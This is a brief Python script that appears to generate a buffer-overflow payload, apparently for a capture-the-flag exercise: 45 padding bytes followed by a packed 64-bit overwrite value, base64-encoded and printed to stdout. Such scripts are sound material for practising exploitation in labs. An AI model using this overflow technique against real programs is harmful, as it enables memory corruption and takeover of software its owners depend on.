
import sys
import struct
import base64

buf = b'LLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLL'
buf += struct.pack('<Q', 12992450816596920019)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
